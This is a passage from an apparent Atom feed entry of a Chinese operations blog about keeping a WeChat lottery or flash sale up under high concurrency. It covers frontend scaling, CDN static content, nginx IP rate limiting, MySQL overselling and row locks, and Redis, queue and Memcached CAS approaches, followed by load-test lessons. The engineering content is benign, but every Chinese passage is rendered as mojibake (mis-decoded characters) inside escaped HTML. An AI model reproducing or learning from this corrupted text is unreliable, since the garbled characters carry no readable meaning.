class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é¢å¯¹é«˜å¹¶å‘çš„æŠ¢è´­æ´»åŠ¨ï¼Œå‰ç«¯å¸¸ç”¨çš„ä¸‰æ¿æ–§æ˜¯ã€æ‰©å®¹ã€‘ã€é™æ€åŒ–ã€‘ã€é™æµã€‘&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€Aï¼šæ‰©å®¹&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€åŠ æœºå™¨ï¼Œè¿™æ˜¯æœ€ç®€å•çš„æ–¹æ³•ï¼Œé€šè¿‡å¢åŠ å‰ç«¯æ± çš„æ•´ä½“æ‰¿è½½é‡æ¥æŠ—å³°å€¼ã€‚ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€è¿™é‡Œæˆ‘ä»¬éƒ½æ˜¯å¤šå°ä¸»ä»é›†ç¾¤å»è·‘ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€&lt;span class=&quot;keyword&quot;&gt;Bï¼šé™æ€åŒ–&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€å°†æ´»åŠ¨é¡µé¢ä¸Šçš„æ‰€æœ‰å¯ä»¥é™æ€çš„å…ƒç´ å…¨éƒ¨é™æ€åŒ–ï¼Œå¹¶å°½é‡å‡å°‘åŠ¨æ€å…ƒç´ ã€‚é€šè¿‡CDNæ¥æŠ—å³°å€¼ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€è¿™é‡Œæˆ‘ä»¬éƒ½æ˜¯æŠŠå›¾ç‰‡é™æ€æ”¾åœ¨åˆæ‹äº‘å’Œé˜¿é‡Œäº‘ä¸Šé¢ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€Cï¼šé™æµ&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€ä¸€èˆ¬éƒ½ä¼šé‡‡ç”¨&lt;span class=&quot;built_in&quot;&gt;IP&lt;/span&gt;çº§åˆ«çš„é™æµï¼Œå³é’ˆå¯¹æŸä¸€ä¸ª&lt;span class=&quot;built_in&quot;&gt;IP&lt;/span&gt;ï¼Œé™åˆ¶å•ä½æ—¶é—´å†…å‘èµ·è¯·æ±‚æ•°é‡ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€æˆ–è€…æ´»åŠ¨å…¥å£çš„æ—¶å€™å¢åŠ æ¸¸æˆæˆ–è€…é—®é¢˜ç¯èŠ‚è¿›è¡Œæ¶ˆå³°æ“ä½œã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€æˆ‘ä»¬é‡‡ç”¨Nginx å‰é¢åšäº†åå‘ä»£ç†åé¢ä¼˜åŒ–nginxã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€Dï¼šæœ‰æŸæœåŠ¡&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€æœ€åä¸€æ‹›ï¼Œåœ¨æ¥è¿‘å‰ç«¯æ± æ‰¿è½½èƒ½åŠ›çš„æ°´ä½ä¸Šé™çš„æ—¶å€™ï¼Œéšæœºæ‹’ç»éƒ¨åˆ†è¯·æ±‚æ¥ä¿æŠ¤æ´»åŠ¨æ•´ä½“çš„å¯ç”¨æ€§ã€‚&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;2ã€åç«¯&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆåç«¯çš„æ•°æ®åº“åœ¨é«˜å¹¶å‘å’Œè¶…å–ä¸‹ä¼šé‡åˆ°ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿä¸»è¦ä¼šæœ‰å¦‚ä¸‹3ä¸ªé—®é¢˜ï¼šï¼ˆä¸»è¦è®¨è®ºå†™çš„é—®é¢˜ï¼Œè¯»çš„é—®é¢˜é€šè¿‡å¢åŠ cacheå¯ä»¥å¾ˆå®¹æ˜“çš„è§£å†³ï¼‰&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€Iï¼šã€€é¦–å…ˆMySQLè‡ªèº«å¯¹äºé«˜å¹¶å‘çš„å¤„ç†æ€§èƒ½å°±ä¼šå‡ºç°é—®é¢˜ï¼Œä¸€èˆ¬æ¥è¯´ï¼ŒMySQLçš„å¤„ç†æ€§èƒ½ä¼šéšç€å¹¶å‘threadä¸Šå‡è€Œä¸Šå‡ï¼Œä½†æ˜¯åˆ°äº†ä¸€å®šçš„å¹¶å‘åº¦ä¹‹åä¼šå‡ºç°æ˜æ˜¾çš„æ‹ç‚¹ï¼Œä¹‹åä¸€è·¯ä¸‹é™ï¼Œæœ€ç»ˆç”šè‡³ä¼šæ¯”å•threadçš„æ€§èƒ½è¿˜è¦å·®ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€IIï¼š å…¶æ¬¡ï¼Œè¶…å–çš„æ ¹ç»“åœ¨äºå‡åº“å­˜æ“ä½œæ˜¯ä¸€ä¸ªäº‹åŠ¡æ“ä½œï¼Œéœ€è¦å…ˆ&lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt;ï¼Œç„¶å&lt;span class=&quot;keyword&quot;&gt;insert&lt;/span&gt;ï¼Œæœ€å&lt;span class=&quot;keyword&quot;&gt;update&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;ã€‚æœ€åè¿™ä¸ª&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;æ“ä½œæ˜¯ä¸èƒ½å‡ºç°è´Ÿæ•°çš„ï¼Œä½†æ˜¯å½“å¤šç”¨æˆ·åœ¨æœ‰åº“å­˜çš„æƒ…å†µä¸‹å¹¶å‘æ“ä½œï¼Œå‡ºç°è´Ÿæ•°è¿™æ˜¯æ— æ³•é¿å…çš„ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€IIIï¼šæœ€åï¼Œå½“å‡åº“å­˜å’Œé«˜å¹¶å‘ç¢°åˆ°ä¸€èµ·çš„æ—¶å€™ï¼Œç”±äºæ“ä½œçš„åº“å­˜æ•°ç›®åœ¨åŒä¸€è¡Œï¼Œå°±ä¼šå‡ºç°äº‰æŠ¢&lt;span class=&quot;keyword&quot;&gt;InnoDB&lt;/span&gt;è¡Œé”çš„é—®é¢˜ï¼Œå¯¼è‡´å‡ºç°äº’ç›¸ç­‰å¾…ç”šè‡³æ­»é”ï¼Œä»è€Œå¤§å¤§é™ä½MySQLçš„å¤„ç†æ€§èƒ½ï¼Œæœ€ç»ˆå¯¼è‡´å‰ç«¯é¡µé¢å‡ºç°è¶…æ—¶å¼‚å¸¸ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€è¿™ä¸ªæœ‰é‡åˆ°è¿‡çš„ï¼Œå°±æ˜¯é”è¡¨å¯¼è‡´è®¿é—®å‡ºç°ç½‘ç»œå¼‚å¸¸ã€‚&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;é’ˆå¯¹ä¸Šè¿°é—®é¢˜ï¼Œå¦‚ä½•è§£å†³å‘¢ï¼Ÿ æˆ‘ä»¬å…ˆçœ‹çœ¼æ·˜å®çš„é«˜å¤§ä¸Šè§£å†³æ–¹æ¡ˆï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight axapta&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ã€€Iï¼š  å…³é—­æ­»é”æ£€æµ‹ï¼Œæé«˜å¹¶å‘å¤„ç†æ€§èƒ½ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€IIï¼šä¿®æ”¹æºä»£ç ï¼Œå°†æ’é˜Ÿæåˆ°è¿›å…¥å¼•æ“å±‚å‰ï¼Œé™ä½å¼•æ“å±‚é¢çš„å¹¶å‘åº¦ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ã€€ã€€IIIï¼šç»„æäº¤ï¼Œé™ä½&lt;span class=&quot;keyword&quot;&gt;server&lt;/span&gt;å’Œå¼•æ“çš„äº¤äº’æ¬¡æ•°ï¼Œé™ä½IOæ¶ˆè€—ã€‚&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;è§£å†³æ–¹æ¡ˆ1ï¼š&quot;&gt;&lt;a href=&quot;#è§£å†³æ–¹æ¡ˆ1ï¼š&quot; class=&quot;headerlink&quot; title=&quot;è§£å†³æ–¹æ¡ˆ1ï¼š&quot;&gt;&lt;/a&gt;è§£å†³æ–¹æ¡ˆ1ï¼š&lt;/h3&gt;&lt;p&gt;å°†å­˜åº“ä»MySQLå‰ç§»åˆ°Redisä¸­ï¼Œæ‰€æœ‰çš„å†™æ“ä½œæ”¾åˆ°å†…å­˜ä¸­ï¼Œç”±äºRedisä¸­ä¸å­˜åœ¨é”æ•…ä¸ä¼šå‡ºç°äº’ç›¸ç­‰å¾…ï¼Œå¹¶ä¸”ç”±äºRedisçš„å†™æ€§èƒ½å’Œè¯»æ€§èƒ½éƒ½è¿œé«˜äºMySQLï¼Œè¿™å°±è§£å†³äº†é«˜å¹¶å‘ä¸‹çš„æ€§èƒ½é—®é¢˜ã€‚ç„¶åé€šè¿‡é˜Ÿåˆ—ç­‰å¼‚æ­¥æ‰‹æ®µï¼Œå°†å˜åŒ–çš„æ•°æ®å¼‚æ­¥å†™å…¥åˆ°DBä¸­ã€‚&lt;/p&gt;
&lt;p&gt;ä¼˜ç‚¹ï¼šè§£å†³æ€§èƒ½é—®é¢˜&lt;/p&gt;
&lt;p&gt;ç¼ºç‚¹ï¼šæ²¡æœ‰è§£å†³è¶…å–é—®é¢˜ï¼ŒåŒæ—¶ç”±äºå¼‚æ­¥å†™å…¥DBï¼Œå­˜åœ¨æŸä¸€æ—¶åˆ»DBå’ŒRedisä¸­æ•°æ®ä¸ä¸€è‡´çš„é£é™©ã€‚&lt;/p&gt;
&lt;h3 id=&quot;è§£å†³æ–¹æ¡ˆ2ï¼š&quot;&gt;&lt;a href=&quot;#è§£å†³æ–¹æ¡ˆ2ï¼š&quot; class=&quot;headerlink&quot; title=&quot;è§£å†³æ–¹æ¡ˆ2ï¼š&quot;&gt;&lt;/a&gt;è§£å†³æ–¹æ¡ˆ2ï¼š&lt;/h3&gt;&lt;p&gt;å¼•å…¥é˜Ÿåˆ—ï¼Œç„¶åå°†æ‰€æœ‰å†™DBæ“ä½œåœ¨å•é˜Ÿåˆ—ä¸­æ’é˜Ÿï¼Œå®Œå…¨ä¸²è¡Œå¤„ç†ã€‚å½“è¾¾åˆ°åº“å­˜é˜€å€¼çš„æ—¶å€™å°±ä¸åœ¨æ¶ˆè´¹é˜Ÿåˆ—ï¼Œå¹¶å…³é—­è´­ä¹°åŠŸèƒ½ã€‚è¿™å°±è§£å†³äº†è¶…å–é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;ä¼˜ç‚¹ï¼šè§£å†³è¶…å–é—®é¢˜ï¼Œç•¥å¾®æå‡æ€§èƒ½ã€‚&lt;/p&gt;
&lt;p&gt;ç¼ºç‚¹ï¼šæ€§èƒ½å—é™äºé˜Ÿåˆ—å¤„ç†æœºå¤„ç†æ€§èƒ½å’ŒDBçš„å†™å…¥æ€§èƒ½ä¸­æœ€çŸ­çš„é‚£ä¸ªï¼Œå¦å¤–å¤šå•†å“åŒæ—¶æŠ¢è´­çš„æ—¶å€™éœ€è¦å‡†å¤‡å¤šæ¡é˜Ÿåˆ—ã€‚&lt;/p&gt;
&lt;h3 id=&quot;è§£å†³æ–¹æ¡ˆ3ï¼š&quot;&gt;&lt;a href=&quot;#è§£å†³æ–¹æ¡ˆ3ï¼š&quot; class=&quot;headerlink&quot; title=&quot;è§£å†³æ–¹æ¡ˆ3ï¼š&quot;&gt;&lt;/a&gt;è§£å†³æ–¹æ¡ˆ3ï¼š&lt;/h3&gt;&lt;p&gt;å°†å†™æ“ä½œå‰ç§»åˆ°MCä¸­ï¼ŒåŒæ—¶åˆ©ç”¨MCçš„è½»é‡çº§çš„é”æœºåˆ¶CASæ¥å®ç°å‡åº“å­˜æ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;ä¼˜ç‚¹ï¼šè¯»å†™åœ¨å†…å­˜ä¸­ï¼Œæ“ä½œæ€§èƒ½å¿«ï¼Œå¼•å…¥è½»é‡çº§é”ä¹‹åå¯ä»¥ä¿è¯åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªå†™å…¥æˆåŠŸï¼Œè§£å†³å‡åº“å­˜é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;ç¼ºç‚¹ï¼šæ²¡æœ‰å®æµ‹ï¼ŒåŸºäºCASçš„ç‰¹æ€§ä¸çŸ¥é“é«˜å¹¶å‘ä¸‹æ˜¯å¦ä¼šå‡ºç°å¤§é‡æ›´æ–°å¤±è´¥ï¼Ÿä¸è¿‡åŠ é”ä¹‹åè‚¯å®šå¯¹å¹¶å‘æ€§èƒ½ä¼šæœ‰å½±å“ã€‚&lt;/p&gt;
&lt;h3 id=&quot;è§£å†³æ–¹æ¡ˆ4ï¼š&quot;&gt;&lt;a href=&quot;#è§£å†³æ–¹æ¡ˆ4ï¼š&quot; class=&quot;headerlink&quot; title=&quot;è§£å†³æ–¹æ¡ˆ4ï¼š&quot;&gt;&lt;/a&gt;è§£å†³æ–¹æ¡ˆ4ï¼š&lt;/h3&gt;&lt;p&gt;å°†æäº¤æ“ä½œå˜æˆä¸¤æ®µå¼ï¼Œå…ˆç”³è¯·åç¡®è®¤ã€‚ç„¶ååˆ©ç”¨Redisçš„åŸå­è‡ªå¢æ“ä½œï¼ˆç›¸æ¯”è¾ƒMySQLçš„è‡ªå¢æ¥è¯´æ²¡æœ‰ç©ºæ´ï¼‰ï¼ŒåŒæ—¶åˆ©ç”¨Redisçš„äº‹åŠ¡ç‰¹æ€§æ¥å‘å·ï¼Œä¿è¯æ‹¿åˆ°å°äºç­‰äºåº“å­˜é˜€å€¼çš„å·çš„äººéƒ½å¯ä»¥æˆåŠŸæäº¤è®¢å•ã€‚ç„¶åæ•°æ®å¼‚æ­¥æ›´æ–°åˆ°DBä¸­ã€‚&lt;/p&gt;
&lt;p&gt;ä¼˜ç‚¹ï¼šè§£å†³è¶…å–é—®é¢˜ï¼Œåº“å­˜è¯»å†™éƒ½åœ¨å†…å­˜ä¸­ï¼Œæ•…åŒæ—¶è§£å†³æ€§èƒ½é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;ç¼ºç‚¹ï¼šç”±äºå¼‚æ­¥å†™å…¥DBï¼Œå¯èƒ½å­˜åœ¨æ•°æ®ä¸ä¸€è‡´ã€‚å¦å¯èƒ½å­˜åœ¨å°‘ä¹°ï¼Œä¹Ÿå°±æ˜¯å¦‚æœæ‹¿åˆ°å·çš„äººä¸çœŸæ­£ä¸‹è®¢å•ï¼Œå¯èƒ½åº“å­˜å‡ä¸º0ï¼Œä½†æ˜¯è®¢å•æ•°å¹¶æ²¡æœ‰è¾¾åˆ°åº“å­˜é˜€å€¼ã€‚&lt;/p&gt;
&lt;p&gt; ä¸‰ã€æ€»ç»“&lt;/p&gt;
&lt;figure class=&quot;highlight lsl&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;ã€å‰ç«¯ä¸‰æ¿æ–§ã€æ‰©å®¹ã€‘ã€é™æµã€‘ã€é™æ€åŒ–ã€‘&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;ã€åç«¯ä¸¤æ¡è·¯ã€å†…å­˜ã€‘+ã€æ’é˜Ÿã€‘&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;æµ‹è¯•æ€»ç»“ç»éªŒ&quot;&gt;&lt;a href=&quot;#æµ‹è¯•æ€»ç»“ç»éªŒ&quot; class=&quot;headerlink&quot; title=&quot;æµ‹è¯•æ€»ç»“ç»éªŒ&quot;&gt;&lt;/a&gt;æµ‹è¯•æ€»ç»“ç»éªŒ&lt;/h4&gt;&lt;p&gt;ç¬¬ä¸€æ¬¡åšæŠ½å¥–æ´»åŠ¨ï¼Œæµ‹è¯•é‚£è¾¹æµ‹è¯•å‡ºå¾ˆå¤šé—®é¢˜ã€‚ ä¸‹é¢æ˜¯é‡åˆ°çš„é—®é¢˜ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight x86asm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;æµ‹è¯•ç¬¬ä¸€æ¬¡: è®¿é—®å‹æµ‹å‡ºç°äº†è®¿é—®ç™½å±ã€‚å®šä½ï¼šä»£ç å†™çš„æœ‰é—®é¢˜ã€‚ tomcatéœ€è¦åšä¼˜åŒ–ã€‚ æˆ‘ä»¬ä¸€èˆ¬ç”¨æˆ·é‡ç²‰ä¸åœ¨100W&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æµ‹è¯•ç¬¬äºŒæ¬¡ï¼š å‡ºç°æ•°æ®åº“&lt;span class=&quot;meta&quot;&gt;CPU&lt;/span&gt;ç“¶é¢ˆè¿‡é«˜ã€‚ä¸»ä»åŒæ­¥ï¼Œç„¶ååšäº†æ•°æ®åº“è¯»å†™åˆ†ç¦»ï¼Œ redisé›†ç¾¤ç¼“å­˜ã€‚ æœ€ä¸»è¦æ˜¯æ•°æ®åº“SQLè¯­å¥åšäº†ä¼˜åŒ–ã€‚ä¼˜åŒ–äº†æå‡äº†å¾ˆå¤§ä¸€éƒ¨åˆ†ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æµ‹è¯•ç¬¬ä¸‰æ¬¡ï¼šè¿˜æœ‰å‡ºç°äº†&lt;span class=&quot;number&quot;&gt;503&lt;/span&gt;è®¿é—®å—é™äº†ã€‚ åé¢åšäº†nginxä»£ç† é˜²æ­¢åŒä¸€ä¸ª&lt;span class=&quot;built_in&quot;&gt;IP&lt;/span&gt;åŒä¸€ä¸ªæ—¶é—´è¶…è¿‡å¤šå°‘æ¬¡å»è¯·æ±‚ï¼Œä¼šè¢«å—é™ã€‚ ä¸è¿‡è¿™ä¸ªåšDDOSæ”»å‡» æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†å½±å“ç”¨æˆ·åä½“éªŒåº¦ã€‚&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;å››ã€éæŠ€æœ¯æ„Ÿæƒ³&quot;&gt;&lt;a href=&quot;#å››ã€éæŠ€æœ¯æ„Ÿæƒ³&quot; class=&quot;headerlink&quot; title=&quot;å››ã€éæŠ€æœ¯æ„Ÿæƒ³&quot;&gt;&lt;/a&gt;å››ã€éæŠ€æœ¯æ„Ÿæƒ³&lt;/h4&gt;&lt;p&gt;1ã€å›¢é˜Ÿçš„åŠ›é‡æ˜¯æ— ç©·çš„ï¼Œå„ç§å„æ ·çš„è§£å†³æ–¹æ¡ˆï¼ˆå…ˆä¸è°ˆå¯è¡Œæ€§ï¼‰éƒ½æ˜¯åœ¨å°ä¼™ä¼´ä»¬ä¸ƒå˜´å…«èˆŒä¸­è®¨è®ºå‡ºæ¥çš„ã€‚æˆ‘ä»¬éœ€è¦è®©æ‰€æœ‰äººéƒ½å‘å‡ºè‡ªå·±çš„å£°éŸ³ï¼Œä¸è¦ç€æ€¥å»å¦å®šã€‚&lt;/p&gt;
&lt;p&gt;2ã€ä¼˜åŒ–éœ€è¦ä»æ•´ä½“å±‚é¢å»æ€è€ƒï¼Œä¸è¦åªçº ç»“äºè‡ªå·±è´Ÿè´£çš„éƒ¨åˆ†ï¼Œå¦‚æœåªç›¯ç€ä¸€ä¸ªç‚¹æ€è€ƒï¼Œæœ€åå¾ˆå¯èƒ½å°±èµ°è¿›æ­»èƒ¡åŒä¸­äº†ã€‚&lt;/p&gt;
&lt;p&gt;3ã€æœ‰å¾ˆå¤šä¸œè¥¿ä»¥ä¸ºè¯»è¿‡äº†å°±æ‡‚äº†ï¼Œå…¶å®ä¸ç„¶ã€‚ä¾ç„¶è¿˜æ˜¯éœ€è¦å®è·µï¼Œå¦åˆ™åˆ«äººçš„çŸ¥è¯†æ°¸è¿œä¸å¯èƒ½å˜æˆè‡ªå·±çš„ã€‚&lt;/p&gt;
&lt;p&gt;4ã€å¤šæ€è€ƒä¸ºä»€ä¹ˆï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Œä¸è¦æƒ³å½“ç„¶ã€‚åªæœ‰è¿™æ ·æ‰èƒ½æ·±å…¥è¿›å»ï¼Œè€Œä¸æ˜¯ç•™åœ¨è¡¨é¢ã€‚&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘ä¸šåŠ¡è¯•æ°´å¾®ä¿¡æŠ½å¥–æ´»åŠ¨ï¼Œå…¬å¸ç°åœ¨æ‰“ç®—æ¨å¹¿ä¸‹äº§å“ã€‚å¢åŠ äº›ç²‰ä¸é‡ ä¹‹å‰ç»å¸¸çœ‹åˆ°æ·˜å®çš„åŒè¡Œä»¬è®¨è®ºç§’æ€ï¼Œè®¨è®ºç”µå•†ï¼Œè¿™æ¬¡ç»ˆäºè½®åˆ°æˆ‘ä»¬è‡ªå·±ç†è®ºç»“åˆå®é™…ä¸€æ¬¡äº†ã€‚&lt;/p&gt;
&lt;p&gt;psï¼šè¿›å…¥æ­£æ–‡å‰å…ˆè¯´ä¸€ç‚¹ä¸ªäººæ„Ÿå—ï¼Œä¹‹å‰çœ‹æ·˜å®çš„pptæ„Ÿè§‰éƒ½æ‡‚äº†ï¼Œç­‰åˆ°è‡ªå·±å‡ºè§£å†³æ–¹æ¡ˆçš„æ—¶å€™å‘ç°è¿˜æ˜¯æœ‰å¾ˆå¤šæƒ³ä¸åˆ°çš„
    
    </summary>
    
      <category term="è¿ç»´ç¬”è®°" scheme="http://blog.yangcvo.me/categories/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
